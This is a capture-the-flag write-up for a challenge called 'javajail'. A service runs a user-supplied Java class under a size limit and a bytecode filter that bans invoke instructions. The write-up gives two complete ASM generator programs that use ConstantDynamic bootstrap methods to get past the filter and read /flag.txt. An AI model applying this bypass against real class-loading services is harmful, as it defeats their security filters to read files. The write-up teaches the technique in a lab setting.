@@ -1,0 +1,167 @@
+---
+title: "javajail"
+categories: ["misc"]
+solves: 55
+---
+# Challenge
+A service that loads the class file you provide and executes `run()`. The goal is to read the flag at `/flag.txt`, subject to the following constraints:
+
+- Class size must be 650 bytes or less
+- The class must not contain the ASCII string `Runtime`
+- The class must not contain `invokestatic` / `invokevirtual` / `invokespecial` / `invokeinterface` / `invokedynamic`
+
+# Solution
+Without the filters, you could compile code that calls `System.out.println(Files.readString(new File("/flag.txt").toPath()));` inside `run` and submit it.
+However, in the JVM, method calls like `readString` and `println` are compiled to `invokestatic` or `invokevirtual` bytecode instructions, making calling any method inside `run()` seemingly impossible.
+
+To work around this, we use `ConstantDynamic`. This is a mechanism that allows executing arbitrary processing via `ConstantBootstraps` when loading a constant with the `ldc` instruction, and returning the result as a constant.
+In other words, by executing an `ldc` instruction inside `run()`, we can trigger method-call-equivalent processing.
+
+Code that generates a class file executing `System.out.println(Files.readString(new File("/flag.txt").toPath()));` this way could look like:
+
+<details>
+<summary>Class file generation code (click to expand)</summary>
+```java
+import jdk.internal.org.objectweb.asm.*;
+import static jdk.internal.org.objectweb.asm.Opcodes.*;
+import java.util.Base64;
+
+public class Gen {
+    public static void main(String[] args) throws Exception {
+        ClassWriter cw = new ClassWriter(0);
+        cw.visit(V17, ACC_PUBLIC, "X", null, "java/lang/Object", null);
+
+        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "run", "()V", null, null);
+        mv.visitCode();
+
+        Handle bsmInvoke = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "invoke",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/invoke/MethodHandle;[Ljava/lang/Object;)Ljava/lang/Object;",
+            false
+        );
+
+        Handle bsmGetStaticFinal = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "getStaticFinal",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/Class;)Ljava/lang/Object;",
+            false
+        );
+        ConstantDynamic file = new ConstantDynamic(
+            "_",
+            "Ljava/io/File;",
+            bsmInvoke,
+            new Handle(H_NEWINVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false),
+            "/flag.txt"
+        );
+        ConstantDynamic path = new ConstantDynamic(
+            "_",
+            "Ljava/nio/file/Path;",
+            bsmInvoke,
+            new Handle(H_INVOKEVIRTUAL, "java/io/File", "toPath", "()Ljava/nio/file/Path;", false),
+            file
+        );
+        ConstantDynamic str = new ConstantDynamic(
+            "_",
+            "Ljava/lang/String;",
+            bsmInvoke,
+            new Handle(H_INVOKESTATIC, "java/nio/file/Files", "readString", "(Ljava/nio/file/Path;)Ljava/lang/String;", false),
+            path
+        );
+        ConstantDynamic out = new ConstantDynamic(
+            "_",
+            "Ljava/io/PrintStream;",
+            bsmGetStaticFinal,
+            new Object[]{ Type.getType("Ljava/lang/System;") }
+        );
+        ConstantDynamic print = new ConstantDynamic(
+            "_",
+            "Ljava/lang/Object;",
+            bsmInvoke,
+            new Object[]{
+                new Handle(H_INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false),
+                out,
+                str
+            }
+        );
+        mv.visitLdcInsn(print);
+        mv.visitInsn(POP);
+        mv.visitInsn(RETURN);
+        mv.visitMaxs(1, 0);
+        mv.visitEnd();
+
+        cw.visitEnd();
+        byte[] bytesOut = cw.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(bytesOut));
+    }
+}
+```
+</details>
+
+Running this produces a 979-byte class file, which unfortunately does not satisfy the first condition of "class size must be 650 bytes or less."
+In this approach, using 5 `ConstantDynamic` instances is the main cause of the size increase, so we need to find a way to perform equivalent processing with a shorter chain.
+
+There are several approaches, but the intended solution is the call `new FileInputStream("flag.txt").transferTo(System.out)`. This form allows us to reduce the number of `ConstantDynamic` instances to 3.
+The class file can be generated as follows.
+
+<details>
+<summary>Class file generation code (click to expand)</summary>
+```java
+import jdk.internal.org.objectweb.asm.*;
+import static jdk.internal.org.objectweb.asm.Opcodes.*;
+import java.util.Base64;
+
+public class Gen {
+    public static void main(String[] args) throws Exception {
+        ClassWriter cw = new ClassWriter(0);
+        cw.visit(V17, ACC_PUBLIC, "X", null, "java/lang/Object", null);
+
+        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "run", "()V", null, null);
+        mv.visitCode();
+
+        Handle bsm = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "invoke",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/invoke/MethodHandle;[Ljava/lang/Object;)Ljava/lang/Object;",
+            false
+        );
+        ConstantDynamic fis = new ConstantDynamic(
+            "out",
+            "Ljava/io/FileInputStream;",
+            bsm,
+            new Handle(H_NEWINVOKESPECIAL, "java/io/FileInputStream", "<init>", "(Ljava/lang/String;)V", false),
+            "/flag.txt"
+        );
+        ConstantDynamic sysOut = new ConstantDynamic(
+            "out",
+            "Ljava/io/PrintStream;",
+            bsm,
+            new Handle(H_GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;", false)
+        );
+        ConstantDynamic transferred = new ConstantDynamic(
+            "out",
+            "J",
+            bsm,
+            new Handle(H_INVOKEVIRTUAL, "java/io/FileInputStream", "transferTo", "(Ljava/io/OutputStream;)J", false),
+            fis,
+            sysOut
+        );
+        mv.visitLdcInsn(transferred);
+        mv.visitInsn(POP2);
+        mv.visitInsn(RETURN);
+
+        mv.visitMaxs(2, 0);
+        mv.visitEnd();
+
+        cw.visitEnd();
+        byte[] classBytes = cw.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(classBytes));
+    }
+}
+```
+</details>
+
+The byte count is 634 bytes, satisfying the constraint. Furthermore, by optimizations such as reusing the same string constants referenced in the class file, we have confirmed it can be reduced to 617 bytes. If you can reduce it further, please let me know.
